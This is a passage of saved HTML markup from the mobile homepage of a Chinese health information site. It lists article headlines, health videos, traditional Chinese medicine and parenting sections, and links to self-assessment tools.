                                <div class="mip-placeholder mip-placeholder-jpg"></div>
                                <img class="mip-img-loading mip-fill-content mip-replaced-content"
                                     title="更年期女性能喝四物汤吗 怎么服用才正确" alt="更年期女性能喝四物汤吗 怎么服用才正确"
                                     src="./99健康网_99相伴健康一生_files/432-1Z109103P04B.jpg">
                                <div class="mip-placeholder mip-placeholder-jpg"></div>
                            </mip-img>
                            <div class="mip-carousle-subtitle"><span></span><samp>更年期女性能喝四物汤吗 怎么服用才正确</samp></div>
                        </a></div>
                    <div class="mip-carousel-slideBox" style="width: 16.6667%;"><a
                                href="https://mip.99.com.cn/a/752461/" title="冬季适合泡脚养生 你泡对了吗？"
                                class="mip-fill-content mip-replaced-content">
                            <mip-img title="冬季适合泡脚养生 你泡对了吗？" alt="冬季适合泡脚养生 你泡对了吗？"
                                     src="http://img.99.com.cn/uploads/190110/439-1Z110154R24Q.jpg?480_248"
                                     class="mip-element mip-layout-container mip-fill-content mip-replaced-content mip-img-loaded">
                                <img class="mip-fill-content mip-replaced-content" title="冬季适合泡脚养生 你泡对了吗？"
                                     alt="冬季适合泡脚养生 你泡对了吗？" src="./99健康网_99相伴健康一生_files/439-1Z110154R24Q.jpg"></mip-img>
                            <div class="mip-carousle-subtitle"><span></span><samp>冬季适合泡脚养生 你泡对了吗？</samp></div>
                        </a></div>
                    <div class="mip-carousel-slideBox" style="width: 16.6667%;"><a
                                href="https://mip.99.com.cn/a/752450/" title="为何减肥总反弹 都是脂肪在作祟"
                                class="mip-fill-content mip-replaced-content">
                            <mip-img title="为何减肥总反弹 都是脂肪在作祟" alt="为何减肥总反弹 都是脂肪在作祟"
                                     src="http://img.99.com.cn/uploads/190110/439-1Z110093204404.jpg?480_248"
                                     class="mip-element mip-layout-container mip-fill-content mip-replaced-content mip-img-loaded">
                                <img class="mip-fill-content mip-replaced-content" title="为何减肥总反弹 都是脂肪在作祟"
                                     alt="为何减肥总反弹 都是脂肪在作祟" src="./99健康网_99相伴健康一生_files/439-1Z110093204404.jpg"></mip-img>
                            <div class="mip-carousle-subtitle"><span></span><samp>为何减肥总反弹 都是脂肪在作祟</samp></div>
                        </a></div>
                    <div class="mip-carousel-slideBox" style="width: 16.6667%;"><a
                                href="https://mip.99.com.cn/a/752428/" title="这3个行为会伤害乳房 女人千万别去做"
                                class="mip-fill-content mip-replaced-content">
                            <mip-img title="这3个行为会伤害乳房 女人千万别去做" alt="这3个行为会伤害乳房 女人千万别去做"
                                     src="http://img.99.com.cn/uploads/190109/439-1Z109102035V9.jpg?480_248"
                                     class="mip-element mip-layout-container mip-fill-content mip-replaced-content mip-img-loaded">
                                <img class="mip-fill-content mip-replaced-content" title="这3个行为会伤害乳房 女人千万别去做"
                                     alt="这3个行为会伤害乳房 女人千万别去做" src="./99健康网_99相伴健康一生_files/439-1Z109102035V9.jpg"></mip-img>
                            <div class="mip-carousle-subtitle"><span></span><samp>这3个行为会伤害乳房 女人千万别去做</samp></div>
                        </a></div>
                    <div class="mip-carousel-slideBox" style="width: 16.6667%;"><a
                                href="https://mip.99.com.cn/a/752417/" title="更年期女性能喝四物汤吗 怎么服用才正确"
                                class="mip-fill-content mip-replaced-content">
                            <mip-img title="更年期女性能喝四物汤吗 怎么服用才正确" alt="更年期女性能喝四物汤吗 怎么服用才正确"
                                     src="http://img.99.com.cn/uploads/190109/190109/432-1Z109103P04B.jpg?480_248"
                                     class="mip-element mip-layout-container mip-fill-content mip-replaced-content">
                                <div class="mip-placeholder mip-placeholder-jpg"></div>
                                <img class="mip-img-loading mip-fill-content mip-replaced-content"
                                     title="更年期女性能喝四物汤吗 怎么服用才正确" alt="更年期女性能喝四物汤吗 怎么服用才正确"
                                     src="./99健康网_99相伴健康一生_files/432-1Z109103P04B.jpg"></mip-img>
                            <div class="mip-carousle-subtitle"><span></span><samp>更年期女性能喝四物汤吗 怎么服用才正确</samp></div>
                        </a></div>
                    <div class="mip-carousel-slideBox" style="width: 16.6667%;"><a
                                href="https://mip.99.com.cn/a/752461/" title="冬季适合泡脚养生 你泡对了吗？"
                                class="mip-fill-content mip-replaced-content">
                            <mip-img title="冬季适合泡脚养生 你泡对了吗？" alt="冬季适合泡脚养生 你泡对了吗？"
                                     src="http://img.99.com.cn/uploads/190110/439-1Z110154R24Q.jpg?480_248"
                                     class="mip-element mip-layout-container mip-fill-content mip-replaced-content">
                                <div class="mip-placeholder mip-placeholder-jpg"></div>
                                <img class="mip-img-loading mip-fill-content mip-replaced-content" title="冬季适合泡脚养生 你泡对了吗？"
                                     alt="冬季适合泡脚养生 你泡对了吗？" src="./99健康网_99相伴健康一生_files/439-1Z110154R24Q.jpg">
                                <div class="mip-placeholder mip-placeholder-jpg"></div>
                            </mip-img>
                            <div class="mip-carousle-subtitle"><span></span><samp>冬季适合泡脚养生 你泡对了吗？</samp></div>
                        </a></div>
                </div>
            </div>
        </mip-carousel>
        <div class="mip-carousel-indicator-wrapper">
            <div class="mip-carousel-indicatorDot" id="mip-carousel-example">
                <div class="mip-carousel-indecator-item"></div>
                <div class="mip-carousel-indecator-item"></div>
                <div class="mip-carousel-indecator-item mip-carousel-activeitem"></div>
                <div class="mip-carousel-indecator-item"></div>
            </div>
        </div>
    </div>
    <!-- Initialize Swiper -->

    <section class="entrance">
        <a title="找医院" href="https://m.yyk.99.com.cn/">
            <dl>
                <dt class="e_hospital"></dt>
                <dd>找医院</dd>
            </dl>
        </a>
        <a title="查疾病" href="https://m.jbk.99.com.cn/">
            <dl>
                <dt class="e_disease"></dt>
                <dd>查疾病</dd>
            </dl>
        </a>
        <a title="健康百科" href="https://m.99.com.cn/baike/">
            <dl>
                <dt class="e_medicine"></dt>
                <dd>健康百科</dd>
            </dl>
        </a>
        <a title="问医生" href="https://m.ask.99.com.cn/">
            <dl>
                <dt class="e_doctor"></dt>
                <dd>问医生</dd>
            </dl>
        </a>
    </section>
    <section class="hot">
        <ul>
            <li><a href="https://m.99.com.cn/ch/8"><span>[育儿]</span></a><a href="https://mip.99.com.cn/a/752465/"
                                                                           title="宝宝起床出现这4种症状 说明脾胃不好" class="hot_r">宝宝起床出现这4种症状
                    说明脾胃不好</a>
            </li>
            <li><a href="https://m.99.com.cn/ch/749"><span>[中医]</span></a><a href="https://mip.99.com.cn/a/752457/"
                                                                             title="如何养胃好 晨起喝一杯温开水" class="hot_r">如何养胃好
                    晨起喝一杯温开水</a>
            </li>
            <li><a href="https://m.99.com.cn/ch/737"><span>[妇科]</span></a><a href="https://mip.99.com.cn/a/752418/"
                                                                             title="女性为什么老是掉发 滋养秀发多吃4种食物" class="hot_r">女性为什么老是掉发
                    滋养秀发多吃4种食物</a>
            </li>
            <li><a href="https://m.99.com.cn/ch/7"><span>[老人]</span></a><a href="https://mip.99.com.cn/a/752069/"
                                                                           title="老人贫血有什么症状 这4个都是" class="hot_r">老人贫血有什么症状
                    这4个都是</a>
            </li>
            <li><a href="https://m.99.com.cn/ch/5"><span>[男性]</span></a><a href="https://mip.99.com.cn/a/752208/"
                                                                           title="男人冬天容易得前列腺炎 冬天保养很重要" class="hot_r">男人冬天容易得前列腺炎
                    冬天保养很重要</a>
            </li>

        </ul>
        <div class="hot_ico"><samp>精</samp></div>
    </section>
    <div class="ad_index">
        <!--99健康网手机移动网页首页女性上方横幅（u2403251），20:3 创建于 2015-11-16-->
        <mip-embed type="baidu-wm-ext" domain="whfpbc.99.com.cn" token="tcdhb4yupi"
                   class="mip-element mip-layout-container">
            <div id="tcdhb4yupi">
                <iframe width="898" frameborder="0" height="135" scrolling="no"
                        src="./99健康网_99相伴健康一生_files/zqcr.html"></iframe>
            </div>
        </mip-embed>
    </div>
    <section class="video-box">
        <div class="video-top">
            <h2>视频</h2>
        </div>
        <mip-vd-tabs class="mip-element mip-layout-container mip-vd-tabs">
            <section class="mip-vd-tabs-row-tile">


                <div class="mip-vd-tabs-nav">
                    <li class="mip-vd-tabs-nav-selected mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="0"><span
                                class="curr">眼科</span></li>
                    <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="1"><span>儿科</span></li>
                    <li class="mip-vd-tabs-nav-li mip-vd-tabs-log" data-tid="2"><span>内科</span></li>
                </div>
            </section>

            <div class="mip-vd-tabs-content"
                 style="display: block; transform-origin: 0px 0px 0px; opacity: 1; transform: scale(1, 1);">
                <div class="video-cont">

                    <dl>
                        <dt><a href="https://mip.99.com.cn/shipin/1154.html" title="有散光可以做飞秒激光手术吗">有散光可以做飞秒激光手术吗</a>
                        </dt>
                        <dd>
                            <a href="https://mip.99.com.cn/shipin/1154.html" title="有散光可以做飞秒激光手术吗">
                                <mip-img src="//img.99.com.cn/uploads/doctor/20181225/18122504085796.jpg"
                                         title="有散光可以做飞秒激光手术吗" alt="有散光可以做飞秒激光手术吗"
                                         class="mip-element mip-layout-container mip-img-loaded"><img
                                            class="mip-fill-content mip-replaced-content"
                                            src="./99健康网_99相伴健康一生_files/18122504085796.jpg" title="有散光可以做飞秒激光手术吗"
                                            alt="有散光可以做飞秒激光手术吗"></mip-img>
                                <i></i></a>
                            <p><span>播放量 12085</span><font>2018-12-25</font></p>
                        </dd>
                    </dl>


                </div>
                <div class="video-nr">
                    <div class="swiper-container3 ">
                        <div class="swiper-wrapper">

                            <a href="https://mip.99.com.cn/shipin/1148.html" title="做飞秒激光手术注意事项">
                                <dl>
                                    <dt>
                                        <mip-img src="//img.99.com.cn/uploads/doctor/20181225/18122503545082.jpg"
                                                 title="做飞秒激光手术注意事项" alt="做飞秒激光手术注意事项"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content"
                                                    src="./99健康网_99相伴健康一生_files/18122503545082.jpg" title="做飞秒激光手术注意事项"
                                                    alt="做飞秒激光手术注意事项"></mip-img>
                                    </dt>
                                    <dd><span>做飞秒激光手术注意事项</span></dd>
                                </dl>
                                <i></i>
                            </a>


                            <a href="https://mip.99.com.cn/shipin/1146.html" title="孕妇视力下降会遗传吗">
                                <dl>
                                    <dt>
                                        <mip-img src="//img.99.com.cn/uploads/doctor/20181225/18122503494227.jpg"
                                                 title="孕妇视力下降会遗传吗" alt="孕妇视力下降会遗传吗"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content"
                                                    src="./99健康网_99相伴健康一生_files/18122503494227.jpg" title="孕妇视力下降会遗传吗"
                                                    alt="孕妇视力下降会遗传吗"></mip-img>
                                    </dt>
                                    <dd><span>孕妇视力下降会遗传吗</span></dd>
                                </dl>
                                <i></i>
                            </a>


                            <a href="https://mip.99.com.cn/shipin/1144.html" title="哪些人不适合做近视眼手术">
                                <dl>
                                    <dt>
                                        <mip-img src="//img.99.com.cn/uploads/doctor/20181225/18122503462029.jpg"
                                                 title="哪些人不适合做近视眼手术" alt="哪些人不适合做近视眼手术"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content"
                                                    src="./99健康网_99相伴健康一生_files/18122503462029.jpg" title="哪些人不适合做近视眼手术"
                                                    alt="哪些人不适合做近视眼手术"></mip-img>
                                    </dt>
                                    <dd><span>哪些人不适合做近视眼手术</span></dd>
                                </dl>
                                <i></i>
                            </a>


                        </div>
                    </div>
                </div>
                <div class="video-more"><a href="https://m.99.com.cn/shipin/">点击查看更多...</a></div>
            </div>
            <div class="mip-vd-tabs-content" style="display: none;">
                <div class="video-cont">

                    <dl>
                        <dt><a href="https://mip.99.com.cn/shipin/893.html" title="小孩便便出血怎么回事">小孩便便出血怎么回事</a></dt>
                        <dd>
                            <a href="https://mip.99.com.cn/shipin/893.html" title="小孩便便出血怎么回事">
                                <mip-img src="//img.99.com.cn/uploads/doctor/20181212/18121211055495.jpg"
                                         title="小孩便便出血怎么回事" alt="小孩便便出血怎么回事"
                                         class="mip-element mip-layout-container mip-img-loaded"><img
                                            class="mip-fill-content mip-replaced-content"
                                            src="./99健康网_99相伴健康一生_files/18121211055495.jpg" title="小孩便便出血怎么回事"
                                            alt="小孩便便出血怎么回事"></mip-img>
                                <i></i></a>
                            <p><span>播放量 18121</span><font>2018-12-12</font></p>
                        </dd>
                    </dl>


                </div>
                <div class="video-nr">
                    <div class="swiper-container3 ">
                        <div class="swiper-wrapper">

                            <a href="https://mip.99.com.cn/shipin/892.html" title="孩子把泡泡糖咽了怎么办">
                                <dl>
                                    <dt>
                                        <mip-img src="//img.99.com.cn/uploads/doctor/20181212/18121211043460.jpg"
                                                 title="孩子把泡泡糖咽了怎么办" alt="孩子把泡泡糖咽了怎么办"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content"
                                                    src="./99健康网_99相伴健康一生_files/18121211043460.jpg" title="孩子把泡泡糖咽了怎么办"
                                                    alt="孩子把泡泡糖咽了怎么办"></mip-img>
                                    </dt>
                                    <dd><span>孩子把泡泡糖咽了怎么办</span></dd>
                                </dl>
                                <i></i>
                            </a>


                            <a href="https://mip.99.com.cn/shipin/891.html" title="宝宝喉咙有痰咳不出怎么办">
                                <dl>
                                    <dt>
                                        <mip-img src="//img.99.com.cn/uploads/doctor/20181212/18121211023047.jpg"
                                                 title="宝宝喉咙有痰咳不出怎么办" alt="宝宝喉咙有痰咳不出怎么办"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content"
                                                    src="./99健康网_99相伴健康一生_files/18121211023047.jpg" title="宝宝喉咙有痰咳不出怎么办"
                                                    alt="宝宝喉咙有痰咳不出怎么办"></mip-img>
                                    </dt>
                                    <dd><span>宝宝喉咙有痰咳不出怎么办</span></dd>
                                </dl>
                                <i></i>
                            </a>


                            <a href="https://mip.99.com.cn/shipin/890.html" title="宝宝痰咽下去算排痰吗">
                                <dl>
                                    <dt>
                                        <mip-img src="//img.99.com.cn/uploads/doctor/20181212/18121211002350.jpg"
                                                 title="宝宝痰咽下去算排痰吗" alt="宝宝痰咽下去算排痰吗"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content"
                                                    src="./99健康网_99相伴健康一生_files/18121211002350.jpg" title="宝宝痰咽下去算排痰吗"
                                                    alt="宝宝痰咽下去算排痰吗"></mip-img>
                                    </dt>
                                    <dd><span>宝宝痰咽下去算排痰吗</span></dd>
                                </dl>
                                <i></i>
                            </a>


                        </div>
                    </div>
                </div>
                <div class="video-more"><a href="https://m.99.com.cn/shipin/">点击查看更多...</a></div>
            </div>
            <div class="mip-vd-tabs-content" style="display: none;">
                <div class="video-cont">

                    <dl>
                        <dt><a href="https://mip.99.com.cn/shipin/1541.html" title="食物中毒有什么症状">食物中毒有什么症状</a></dt>
                        <dd>
                            <a href="https://mip.99.com.cn/shipin/1541.html" title="食物中毒有什么症状">
                                <mip-img src="//img.99.com.cn/uploads/doctor/20190110/19011002181650.jpg"
                                         title="食物中毒有什么症状" alt="食物中毒有什么症状"
                                         class="mip-element mip-layout-container mip-img-loaded"><img
                                            class="mip-fill-content mip-replaced-content"
                                            src="./99健康网_99相伴健康一生_files/19011002181650.jpg" title="食物中毒有什么症状"
                                            alt="食物中毒有什么症状"></mip-img>
                                <i></i></a>
                            <p><span>播放量 11225</span><font>2019-01-10</font></p>
                        </dd>
                    </dl>


                </div>
                <div class="video-nr">
                    <div class="swiper-container3 ">
                        <div class="swiper-wrapper">

                            <a href="https://mip.99.com.cn/shipin/1539.html" title="煤气中毒有什么症状">
                                <dl>
                                    <dt>
                                        <mip-img src="//img.99.com.cn/uploads/doctor/20190110/19011002160159.jpg"
                                                 title="煤气中毒有什么症状" alt="煤气中毒有什么症状"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content"
                                                    src="./99健康网_99相伴健康一生_files/19011002160159.jpg" title="煤气中毒有什么症状"
                                                    alt="煤气中毒有什么症状"></mip-img>
                                    </dt>
                                    <dd><span>煤气中毒有什么症状</span></dd>
                                </dl>
                                <i></i>
                            </a>


                            <a href="https://mip.99.com.cn/shipin/1538.html" title="酒精中毒有哪些症状">
                                <dl>
                                    <dt>
                                        <mip-img src="//img.99.com.cn/uploads/doctor/20190110/19011002143071.jpg"
                                                 title="酒精中毒有哪些症状" alt="酒精中毒有哪些症状"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content"
                                                    src="./99健康网_99相伴健康一生_files/19011002143071.jpg" title="酒精中毒有哪些症状"
                                                    alt="酒精中毒有哪些症状"></mip-img>
                                    </dt>
                                    <dd><span>酒精中毒有哪些症状</span></dd>
                                </dl>
                                <i></i>
                            </a>


                            <a href="https://mip.99.com.cn/shipin/1535.html" title="酒精中毒以后如何处理">
                                <dl>
                                    <dt>
                                        <mip-img src="//img.99.com.cn/uploads/doctor/20190110/19011002085621.jpg"
                                                 title="酒精中毒以后如何处理" alt="酒精中毒以后如何处理"
                                                 class="mip-element mip-layout-container mip-img-loaded"><img
                                                    class="mip-fill-content mip-replaced-content"
                                                    src="./99健康网_99相伴健康一生_files/19011002085621.jpg" title="酒精中毒以后如何处理"
                                                    alt="酒精中毒以后如何处理"></mip-img>
                                    </dt>
                                    <dd><span>酒精中毒以后如何处理</span></dd>
                                </dl>
                                <i></i>
                            </a>


                        </div>
                    </div>
                </div>
                <div class="video-more"><a href="https://m.99.com.cn/shipin/">点击查看更多...</a></div>
            </div>
        </mip-vd-tabs>
    </section>
    <section class="medicine">
        <div class="med-top"><h2>中医</h2><a href="https://m.99.com.cn/ch/749/">更多&gt;</a></div>
        <div class="med-cont">
            <a href="https://mip.99.com.cn/a/752461/" class="med-list" title="冬季适合泡脚养生 你泡对了吗？">
                <dl>
                    <dt>
                        <mip-img title="冬季适合泡脚养生 你泡对了吗？" src="http://img.99.com.cn/uploads/190110/439-1Z110154R24Q.jpg"
                                 alt="冬季适合泡脚养生 你泡对了吗？" class="mip-element mip-layout-container mip-img-loaded"><img
                                    class="mip-fill-content mip-replaced-content" title="冬季适合泡脚养生 你泡对了吗？"
                                    src="./99健康网_99相伴健康一生_files/439-1Z110154R24Q(1).jpg" alt="冬季适合泡脚养生 你泡对了吗？"></mip-img>
                    </dt>
                    <dd><span>冬季适合泡脚养生 你泡对了吗？</span></dd>
                </dl>
            </a>

            <ul class="med-list2">
                <li><a href="https://mip.99.com.cn/a/752464/" title="长期便秘危害大 容易引发痔疮出血">长期便秘危害大 容易引发痔疮出血</a></li>
                <li><a href="https://mip.99.com.cn/a/752463/" title="女人要少吃糖果 不然易加速衰老">女人要少吃糖果 不然易加速衰老</a></li>
                <li><a href="https://mip.99.com.cn/a/752459/" title="白领易得便秘？原因竟是这样吃早餐">白领易得便秘？原因竟是这样吃早餐</a></li>

            </ul>
        </div>
    </section>
    <section class="herb">
        <a href="https://m.99.com.cn/list/1299/" class="herb-text1" title="中药大全">
            <dl>
                <dt><span>中药大全</span><i class="herb-ico1"></i></dt>
                <dd><p class="herb-txt1">收录最全中草药</p></dd>
            </dl>
        </a>
        <a href="https://m.99.com.cn/list/1287/" class="herb-text2" title="养生百科">
            <dl>
                <dt><span>养生百科</span><i class="herb-ico2"></i></dt>
                <dd><p class="herb-txt2">中医养生全书</p></dd>
            </dl>
        </a>
        <a href="https://m.99.com.cn/list/1308/" class="herb-text3" title="望闻问切">
            <dl>
                <dt><span>望闻问切</span><i class="herb-ico3"></i></dt>
                <dd><p class="herb-txt2">中国经典四诊法</p></dd>
            </dl>
        </a>
    </section>
    <section class="child-box">
        <div class="child-top"><h2>育儿</h2><a href="https://m.99.com.cn/ch/8/">更多&gt;</a></div>
        <div class="child-cont">
            <a href="https://mip.99.com.cn/a/752364/" title="刚出生的宝宝睡眠是件大事 新生妈妈要">
                <dl>
                    <dt>
                        <mip-img title="刚出生的小宝宝睡眠是件大事 新生妈妈要注意"
                                 src="http://img.99.com.cn/uploads/190107/439_101633_1_lit.jpg?330_200"
                                 alt="刚出生的小宝宝睡眠是件大事 新生妈妈要注意" class="mip-element mip-layout-container mip-img-loaded">
                            <img class="mip-fill-content mip-replaced-content" title="刚出生的小宝宝睡眠是件大事 新生妈妈要注意"
                                 src="./99健康网_99相伴健康一生_files/439_101633_1_lit.jpg" alt="刚出生的小宝宝睡眠是件大事 新生妈妈要注意">
                        </mip-img>
                    </dt>
                    <dd>
                        <h3>刚出生的宝宝睡眠是件大事 新生妈妈要</h3>
                        <p>宝宝在睡觉的时候，我们是一定要注意的...</p>
                    </dd>
                </dl>
            </a>
            <a href="https://mip.99.com.cn/a/752357/" title="吸奶器到底有没有必要买？买手动还是电">
                <dl>
                    <dt>
                        <mip-img title="吸奶器到底有没有必要买？买手动还是电动？"
                                 src="http://img.99.com.cn/uploads/190107/439_093515_1_lit.jpg?330_200"
                                 alt="吸奶器到底有没有必要买？买手动还是电动？" class="mip-element mip-layout-container mip-img-loaded"><img
                                    class="mip-fill-content mip-replaced-content" title="吸奶器到底有没有必要买？买手动还是电动？"
                                    src="./99健康网_99相伴健康一生_files/439_093515_1_lit.jpg" alt="吸奶器到底有没有必要买？买手动还是电动？"></mip-img>
                    </dt>
                    <dd>
                        <h3>吸奶器到底有没有必要买？买手动还是电</h3>
                        <p>母乳喂养除了对于小宝宝的健康的至关重...</p>
                    </dd>
                </dl>
            </a>
            <a href="https://mip.99.com.cn/a/752021/" title="孕期必做的唐氏筛查 筛查结果怎么看">
                <dl>
                    <dt>
                        <mip-img title="孕期必做的唐氏筛查 筛查结果怎么看"
                                 src="http://img.99.com.cn/uploads/181225/106_112813_1_lit.jpg?330_200"
                                 alt="孕期必做的唐氏筛查 筛查结果怎么看" class="mip-element mip-layout-container mip-img-loaded"><img
                                    class="mip-fill-content mip-replaced-content" title="孕期必做的唐氏筛查 筛查结果怎么看"
                                    src="./99健康网_99相伴健康一生_files/106_112813_1_lit.jpg" alt="孕期必做的唐氏筛查 筛查结果怎么看"></mip-img>
                    </dt>
                    <dd>
                        <h3>孕期必做的唐氏筛查 筛查结果怎么看</h3>
                        <p>如果宝宝得了唐氏综合征，对整个家庭来...</p>
                    </dd>
                </dl>
            </a>

        </div>
    </section>
    <section class="tool-box">
        <div class="tool-top"><h2>实用工具</h2><a href="https://m.99.com.cn/gongju/">更多&gt;</a></div>
        <div class="tool-nr">
            <div class="tool_cont">
                <div class="u_topmenu">
                    <div class="xw-mask-left"></div>
                    <div class="slider_wrap line">
                        <ul class="u_c_items">
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/ylzscsb/" title="压力指数测量表">
                                            <mip-img title="压力指数测量表" alt="压力指数测量表"
                                                     src="//css1.99.com.cn/css/newsm/images/ylzscsb.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="压力指数测量表"
                                                        alt="压力指数测量表" src="./99健康网_99相伴健康一生_files/ylzscsb.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/ylzscsb/" title="压力指数测量表">压力指数测量表</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/snhtzcs/" title="测一测10年后你的体重">
                                            <mip-img title="测一测10年后你的体重" alt="测一测10年后你的体重"
                                                     src="//css1.99.com.cn/css/newsm/images/snhtzcs.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="测一测10年后你的体重"
                                                        alt="测一测10年后你的体重" src="./99健康网_99相伴健康一生_files/snhtzcs.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/snhtzcs/"
                                           title="测一测10年后你的体重">测一测10年后你的体重</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/gmtzcs/" title="你的体质敏感吗">
                                            <mip-img title="你的体质敏感吗" alt="你的体质敏感吗"
                                                     src="//css1.99.com.cn/css/newsm/images/gmtzcs.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="你的体质敏感吗"
                                                        alt="你的体质敏感吗" src="./99健康网_99相伴健康一生_files/gmtzcs.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/gmtzcs/" title="你的体质敏感吗">你的体质敏感吗</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/ye/bbznkxh/" title="宝宝纸尿裤型号自测">
                                            <mip-img title="宝宝纸尿裤型号自测" alt="宝宝纸尿裤型号自测"
                                                     src="//css1.99.com.cn/css/newsm/images/bbznkxh.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="宝宝纸尿裤型号自测"
                                                        alt="宝宝纸尿裤型号自测" src="./99健康网_99相伴健康一生_files/bbznkxh.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/ye/bbznkxh/" title="宝宝纸尿裤型号自测">宝宝纸尿裤型号自测</a>
                                    </dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/fk/chyycs/" title="产后抑郁测试">
                                            <mip-img title="产后抑郁测试" alt="产后抑郁测试"
                                                     src="//css1.99.com.cn/css/newsm/images/chyycs.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="产后抑郁测试"
                                                        alt="产后抑郁测试" src="./99健康网_99相伴健康一生_files/chyycs.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/fk/chyycs/" title="产后抑郁测试">产后抑郁测试</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/cdjkpf/" title="肠道健康评分测试">
                                            <mip-img title="肠道健康评分测试" alt="肠道健康评分测试"
                                                     src="//css1.99.com.cn/css/newsm/images/cdjkpf.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="肠道健康评分测试"
                                                        alt="肠道健康评分测试" src="./99健康网_99相伴健康一生_files/cdjkpf.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/cdjkpf/" title="肠道健康评分测试">肠道健康评分测试</a>
                                    </dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/sjgdsy/" title="手机过度使用自测表">
                                            <mip-img title="手机过度使用自测表" alt="手机过度使用自测表"
                                                     src="//css1.99.com.cn/css/newsm/images/sjgdsy.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="手机过度使用自测表"
                                                        alt="手机过度使用自测表" src="./99健康网_99相伴健康一生_files/sjgdsy.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/sjgdsy/" title="手机过度使用自测表">手机过度使用自测表</a>
                                    </dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/gzsszc/" title="骨质疏松自测公式">
                                            <mip-img title="骨质疏松自测公式" alt="骨质疏松自测公式"
                                                     src="//css1.99.com.cn/css/newsm/images/gzsszc.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="骨质疏松自测公式"
                                                        alt="骨质疏松自测公式" src="./99健康网_99相伴健康一生_files/gzsszc.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/gzsszc/" title="骨质疏松自测公式">骨质疏松自测公式</a>
                                    </dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/stnljsq/" title="身体年龄计算器">
                                            <mip-img title="身体年龄计算器" alt="身体年龄计算器"
                                                     src="//css1.99.com.cn/css/newsm/images/stnljsq.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="身体年龄计算器"
                                                        alt="身体年龄计算器" src="./99健康网_99相伴健康一生_files/stnljsq.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/stnljsq/" title="身体年龄计算器">身体年龄计算器</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/xzbzc/" title="未来十年你会得心脏病吗">
                                            <mip-img title="未来十年你会得心脏病吗" alt="未来十年你会得心脏病吗"
                                                     src="//css1.99.com.cn/css/newsm/images/xzbzc.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="未来十年你会得心脏病吗"
                                                        alt="未来十年你会得心脏病吗" src="./99健康网_99相伴健康一生_files/xzbzc.png"></mip-img>
                                        </a></dt>
                                    <dd><a href="http://m.99.com.cn/gongju/wx/xzbzc/"
                                           title="未来十年你会得心脏病吗">未来十年你会得心脏病吗</a></dd>
                                </dl>
                            </li>
                            <li>
                                <dl class="tool_txt">
                                    <dt><a href="http://m.99.com.cn/gongju/wx/nvsxzc/" title="女性肾虚自测">
                                            <mip-img title="女性肾虚自测" alt="女性肾虚自测"
                                                     src="//css1.99.com.cn/css/newsm/images/nvsxzc.png"
                                                     class="mip-element mip-layout-container mip-img-loaded"><img
                                                        class="mip-fill-content mip-replaced-content" title="女性肾虚自测"
